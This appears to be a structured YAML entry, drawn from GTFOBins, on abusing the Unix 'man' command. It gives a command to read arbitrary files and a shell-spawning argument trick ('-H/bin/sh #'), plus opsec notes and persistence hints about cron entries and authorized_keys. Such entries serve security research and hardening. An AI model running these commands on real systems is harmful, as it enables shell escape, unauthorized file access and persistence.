---
name: man
capabilities:
- exec
- spawn
- read
required_permissions:
  level: user
difficulty: medium
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: man /path/to/input-file
  notes: The file is shown somehow formatted and displayed in the default pager.
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: 'man ''-H/bin/sh #'' man'
  notes: This requires GNU `troff` (`groff`) to be installed.
references:
- https://gtfobins.github.io/gtfobins/man/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
